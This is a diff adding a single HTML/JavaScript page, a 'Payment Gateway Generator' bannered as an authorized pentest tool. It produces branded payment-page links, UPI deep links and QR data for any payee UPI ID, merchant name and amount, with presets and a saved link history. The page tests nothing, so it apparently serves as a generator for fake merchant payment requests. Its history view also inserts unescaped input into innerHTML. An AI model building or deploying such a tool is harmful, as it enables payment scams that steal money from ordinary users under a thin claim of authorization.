@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway Generator - Authorized Pentest Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .auth-banner {
+            background: #28a745;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .panel {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        input[type="text"],
+        input[type="number"],
+        textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            font-family: 'Courier New', monospace;
+        }
+        
+        input[type="text"]:focus,
+        input[type="number"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .input-hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 5px;
+        }
+        
+        .btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+        
+        .preview-section {
+            margin-top: 30px;
+            border-top: 2px dashed #ddd;
+            padding-top: 30px;
+        }
+        
+        .preview-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .generated-link {
+            background: #f8f9fa;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            word-break: break-all;
+            margin-bottom: 15px;
+        }
+        
+        .iframe-container {
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 600px;
+            border: none;
+        }
+        
+        .quick-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .quick-btn {
+            padding: 8px 15px;
+            background: #e9ecef;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+        
+        .quick-btn:hover {
+            background: #dee2e6;
+        }
+        
+        .two-col {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .two-col {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .output-box {
+            background: #f8f9fa;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #e0e0e0;
+            padding-bottom: 10px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            background: #667eea;
+            color: white;
+        }
+        
+        .tab:hover:not(.active) {
+            background: #f0f0f0;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-banner">
+        ✓ AUTHORIZED PENTESTING ENVIRONMENT - CONTROLLED TESTING ONLY
+    </div>
+    
+    <div class="container">
+        <div class="panel">
+            <h1>Payment Gateway Generator</h1>
+            <p class="subtitle">Create custom payment pages for authorized security testing</p>
+            
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('generator')">Generator</div>
+                <div class="tab" onclick="switchTab('history')">History</div>
+                <div class="tab" onclick="switchTab('settings')">Settings</div>
+            </div>
+            
+            <div id="generator" class="tab-content active">
+                <div class="two-col">
+                    <div>
+                        <div class="form-group">
+                            <label>UPI ID (Payee Address)</label>
+                            <input type="text" id="upiInput" placeholder="example@upi or paytm.user@paytm">
+                            <div class="input-hint">Paste target UPI ID here</div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Amount (INR)</label>
+                            <input type="number" id="amountInput" placeholder="3660" min="1" step="0.01">
+                            <div class="input-hint">Enter any amount</div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Merchant Name</label>
+                            <input type="text" id="nameInput" placeholder="Repay App" value="Secure Merchant">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Transaction Note (Optional)</label>
+                            <input type="text" id="noteInput" placeholder="Payment for services">
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <label>Quick Amount Presets</label>
+                        <div class="quick-actions">
+                            <button class="quick-btn" onclick="setAmount(100)">₹100</button>
+                            <button class="quick-btn" onclick="setAmount(500)">₹500</button>
+                            <button class="quick-btn" onclick="setAmount(1000)">₹1,000</button>
+                            <button class="quick-btn" onclick="setAmount(3660)">₹3,660</button>
+                            <button class="quick-btn" onclick="setAmount(5000)">₹5,000</button>
+                            <button class="quick-btn" onclick="setAmount(9999)">₹9,999</button>
+                        </div>
+                        
+                        <label>Quick UPI Presets</label>
+                        <div class="quick-actions">
+                            <button class="quick-btn" onclick="setUpi('paytm.s12rb9h@pty')">Paytm</button>
+                            <button class="quick-btn" onclick="setUpi('googlepay@okaxis')">GPay</button>
+                            <button class="quick-btn" onclick="setUpi('phonepe@ybl')">PhonePe</button>
+                            <button class="quick-btn" onclick="setUpi('upi@icici')">ICICI</button>
+                        </div>
+                        
+                        <div style="margin-top: 30px;">
+                            <button class="btn btn-primary" onclick="generateLink()">Generate Payment Link</button>
+                            <button class="btn btn-success" onclick="previewPage()">Preview Page</button>
+                            <button class="btn btn-secondary" onclick="clearForm()">Clear</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="preview-section">
+                    <div class="preview-title">Generated Output</div>
+                    
+                    <label>Payment URL:</label>
+                    <div class="generated-link" id="generatedUrl">Click "Generate Payment Link" to create URL...</div>
+                    <button class="btn btn-secondary" onclick="copyUrl()">Copy URL</button>
+                    <button class="btn btn-primary" onclick="openPage()">Open in New Tab</button>
+                    
+                    <label style="margin-top: 20px;">Direct UPI Link:</label>
+                    <div class="generated-link" id="upiLink">UPI deep link will appear here...</div>
+                    
+                    <label style="margin-top: 20px;">QR Code Data:</label>
+                    <div class="output-box" id="qrData">QR code content will appear here...</div>
+                </div>
+                
+                <div class="preview-section" id="previewContainer" style="display: none;">
+                    <div class="preview-title">Live Preview</div>
+                    <div class="iframe-container">
+                        <iframe id="previewFrame" src=""></iframe>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="history" class="tab-content">
+                <h3>Generated Links History</h3>
+                <div id="historyList" style="margin-top: 20px;">
+                    <p style="color: #999;">No history yet. Generate some links!</p>
+                </div>
+                <button class="btn btn-secondary" onclick="clearHistory()" style="margin-top: 20px;">Clear History</button>
+            </div>
+            
+            <div id="settings" class="tab-content">
+                <h3>Generator Settings</h3>
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>Default Base URL</label>
+                    <input type="text" id="baseUrl" value="index.html" placeholder="index.html or https://yourdomain.com/payment">
+                    <div class="input-hint">Base page for generated links</div>
+                </div>
+                <div class="form-group">
+                    <label>Session Timeout (seconds)</label>
+                    <input type="number" id="timerSetting" value="300" min="60" max="3600">
+                </div>
+                <button class="btn btn-primary" onclick="saveSettings()">Save Settings</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let history = JSON.parse(localStorage.getItem('paymentHistory') || '[]');
+        let settings = JSON.parse(localStorage.getItem('paymentSettings') || '{"baseUrl": "index.html", "timer": 300}');
+        
+        function setAmount(amt) {
+            document.getElementById('amountInput').value = amt;
+        }
+        
+        function setUpi(upi) {
+            document.getElementById('upiInput').value = upi;
+        }
+        
+        function generateLink() {
+            const upi = document.getElementById('upiInput').value.trim();
+            const amount = document.getElementById('amountInput').value || '100';
+            const name = encodeURIComponent(document.getElementById('nameInput').value || 'Merchant');
+            const note = encodeURIComponent(document.getElementById('noteInput').value || '');
+            
+            if (!upi) {
+                alert('Please enter a UPI ID');
+                return;
+            }
+            
+            const baseUrl = settings.baseUrl || 'index.html';
+            const url = `${baseUrl}?name=${name}&amount=${amount}&upi=${encodeURIComponent(upi)}&note=${note}`;
+            
+            document.getElementById('generatedUrl').textContent = url;
+            
+            // Generate UPI deep link
+            const upiLink = `upi://pay?pa=${encodeURIComponent(upi)}&pn=${name}&am=${amount}&cu=INR&tn=${note}`;
+            document.getElementById('upiLink').textContent = upiLink;
+            
+            // QR code data
+            document.getElementById('qrData').textContent = upiLink;
+            
+            // Add to history
+            const entry = {
+                timestamp: new Date().toISOString(),
+                upi: upi,
+                amount: amount,
+                name: decodeURIComponent(name),
+                url: url
+            };
+            history.unshift(entry);
+            if (history.length > 50) history = history.slice(0, 50);
+            localStorage.setItem('paymentHistory', JSON.stringify(history));
+            updateHistoryDisplay();
+            
+            return url;
+        }
+        
+        function previewPage() {
+            const url = generateLink();
+            if (url) {
+                document.getElementById('previewContainer').style.display = 'block';
+                document.getElementById('previewFrame').src = url;
+            }
+        }
+        
+        function openPage() {
+            const url = document.getElementById('generatedUrl').textContent;
+            if (url && !url.includes('Click')) {
+                window.open(url, '_blank');
+            } else {
+                alert('Generate a link first!');
+            }
+        }
+        
+        function copyUrl() {
+            const url = document.getElementById('generatedUrl').textContent;
+            if (url && !url.includes('Click')) {
+                navigator.clipboard.writeText(url).then(() => {
+                    alert('URL copied to clipboard!');
+                });
+            }
+        }
+        
+        function clearForm() {
+            document.getElementById('upiInput').value = '';
+            document.getElementById('amountInput').value = '';
+            document.getElementById('noteInput').value = '';
+            document.getElementById('generatedUrl').textContent = 'Click "Generate Payment Link" to create URL...';
+            document.getElementById('upiLink').textContent = 'UPI deep link will appear here...';
+            document.getElementById('qrData').textContent = 'QR code content will appear here...';
+            document.getElementById('previewContainer').style.display = 'none';
+        }
+        
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+            
+            if (tabName === 'history') {
+                updateHistoryDisplay();
+            }
+        }
+        
+        function updateHistoryDisplay() {
+            const container = document.getElementById('historyList');
+            if (history.length === 0) {
+                container.innerHTML = '<p style="color: #999;">No history yet. Generate some links!</p>';
+                return;
+            }
+            
+            let html = '<div style="max-height: 400px; overflow-y: auto;">';
+            history.forEach((entry, idx) => {
+                html += `
+                    <div style="padding: 15px; border-bottom: 1px solid #eee; background: ${idx % 2 === 0 ? '#f8f9fa' : 'white'};">
+                        <div style="font-weight: 600; color: #333;">${entry.name}</div>
+                        <div style="font-size: 13px; color: #666; margin-top: 5px;">
+                            UPI: ${entry.upi} | Amount: ₹${entry.amount}
+                        </div>
+                        <div style="font-size: 11px; color: #999; margin-top: 3px;">
+                            ${new Date(entry.timestamp).toLocaleString()}
+                        </div>
+                        <div style="margin-top: 10px;">
+                            <button class="quick-btn" onclick="loadHistoryEntry(${idx})">Load</button>
+                            <button class="quick-btn" onclick="window.open('${entry.url}', '_blank')">Open</button>
+                        </div>
+                    </div>
+                `;
+            });
+            html += '</div>';
+            container.innerHTML = html;
+        }
+        
+        function loadHistoryEntry(idx) {
+            const entry = history[idx];
+            document.getElementById('upiInput').value = entry.upi;
+            document.getElementById('amountInput').value = entry.amount;
+            document.getElementById('nameInput').value = entry.name;
+            switchTab('generator');
+            document.querySelector('.tab').click();
+        }
+        
+        function clearHistory() {
+            history = [];
+            localStorage.removeItem('paymentHistory');
+            updateHistoryDisplay();
+        }
+        
+        function saveSettings() {
+            settings.baseUrl = document.getElementById('baseUrl').value || 'index.html';
+            settings.timer = parseInt(document.getElementById('timerSetting').value) || 300;
+            localStorage.setItem('paymentSettings', JSON.stringify(settings));
+            alert('Settings saved!');
+        }
+        
+        function loadSettings() {
+            document.getElementById('baseUrl').value = settings.baseUrl;
+            document.getElementById('timerSetting').value = settings.timer;
+        }
+        
+        // Load settings on page load
+        window.onload = loadSettings;
+    </script>
+</body>
+</html>
